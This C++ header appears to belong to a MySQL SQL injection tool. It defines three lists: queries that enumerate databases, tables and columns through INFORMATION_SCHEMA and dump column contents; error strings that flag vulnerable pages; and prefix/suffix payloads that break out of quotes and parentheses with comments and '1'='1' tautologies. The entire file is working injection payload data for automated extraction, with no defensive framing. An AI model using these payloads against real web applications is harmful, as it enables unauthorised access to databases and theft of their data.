//
// Created by zerte on 5/3/2020.
//

#ifndef XDG_QUERIES_H
#define XDG_QUERIES_H

#include <string>
#include <vector>

namespace Injection::MySQL {
    const std::vector<std::string> _queries = {
        "SELECT (ELT(2836=2836,1))", // "test"
        "SELECT IFNULL(CAST(COUNT(schema_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA", // "get_database_count"
        "SELECT MID((IFNULL(CAST(schema_name AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT %d,1", // "get_database_name"
        "SELECT MID((IFNULL(CAST(DATABASE() AS CHAR),0x20)),1,54)", // "get_current_database"
        "SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x%s)", // "get_table_count"
        "SELECT IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x%s AND table_schema=0x%s", // "get_column_count"
        "SELECT MID((IFNULL(CAST(table_name AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x%s) LIMIT %d,1", // "get_table_name"
        "SELECT MID((IFNULL(CAST(column_name AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x%s AND table_schema=0x%s LIMIT %d,1", // "get_column_name"
        "SELECT MID((IFNULL(CAST(column_name AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x%s AND table_schema = 0x%s AND LIKE ('%%%s%%')", // "get_column_name_alt"
        "SELECT MID((IFNULL(CAST(column_type AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x%s AND table_schema=0x%s LIMIT %d,1", // "get_column_type"
        "SELECT COUNT(*) FROM %s.%s", // "get_row_count"
        "SELECT MID((IFNULL(CAST(%s AS NCHAR),0x20)),1,54) FROM %s.%s ORDER BY `%s` LIMIT %d,1", // "dump_column"
        "SELECT MID((IFNULL(CAST(TABLE_NAME AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE ('%%%s%%') AND TABLE_SCHEMA=0x%s LIMIT %d,1", // "get_table_with_column"
        "SELECT MID((IFNULL(CAST(COUNT(*) AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE ('%%%s%%') AND TABLE_SCHEMA=0x%s", // "get_table_count_with_column"
    };

    const std::vector<std::string> _flags = {
        "Fatal error:",
        "error in your SQL syntax",
        "mysql_num_rows()",
        "mysql_fetch_array()",
        "Error Occurred While Processing Request",
        "Server Error in '/' Application",
        "mysql_fetch_row()",
        "Syntax error",
        "mysql_fetch_assoc()",
        "mysql_fetch_object()",
        "mysql_numrows()",
        "GetArray()",
        "FetchRow()",
        "Input string was not in a correct format",
        "You have an error in your SQL syntax",
        "Warning: session_start()",
        "Warning: is_writable()",
        "Warning: Unknown()",
        "Warning: mysql_result()",
        "Warning: mysql_query()",
        "Warning: mysql_num_rows()",
        "Warning: array_merge()",
        "Warning: preg_match()",
        "SQL syntax error",
        "MYSQL error message: supplied argument….",
        "mysql error with query",
    };

    const std::vector<std::pair<std::string, std::string>> _modulators = {
            {"", ""},
            {"", "# %s"},
            {"'", "# %s"},
            {"", "-- %s"},
            {"'", "-- %s"},
            {")", "# %s"},
            {")", "-- %s"},
            {"", " AND %d=%d"},
            {")", " AND (%d=%d"},
            {"", " AND \"%s\" LIKE \"%s"},
            {"\"", " AND \"%s\" LIKE \"%s"},
            {"\")", " AND (\"%s\" LIKE \"%s"},
            {""," AND '1'='1"},
            {"'"," AND '1'='1"},
            {"')"," AND ('1'='1"}, // 15

            {"))", " AND ((%d=%d"},
            {")))", " AND (((%d=%d"},
            {"')", " AND ('%d'='%d"},
            {"'))", " AND (('%d'='%d"},
            {"')))", " AND ((('%d'='%d"},
            {"\"))", " AND ((\"%s\" LIKE \"%s"},
            {"\")))", " AND (((\"%s\" LIKE \"%s"},
            {"')", " AND ('%s' LIKE '%s"},
            {"'))", " AND (('%s' LIKE '%s"},
            {"')))", " AND ((('%s' LIKE '%s"}, // 25

            {"'))"," AND (('1'='1"},
            {"')))"," AND ((('1'='1"},
            {"AND 1'='1'"," AND '1'='1"},
            {"AND 1'='1')"," AND ('1'='1"},
            {"AND 1'='1'))"," AND (('1'='1"},
            {"AND 1'='1')))"," AND ((('1'='1"},
            {"AND 1=1"," AND 1=1"},
            {"AND 1=1)"," AND (1=1"},
            {"AND 1=1))"," AND ((1=1"},
            {"AND 1=1)))"," AND (((1=1"}, // 35
    };
}

#endif //XDG_QUERIES_H
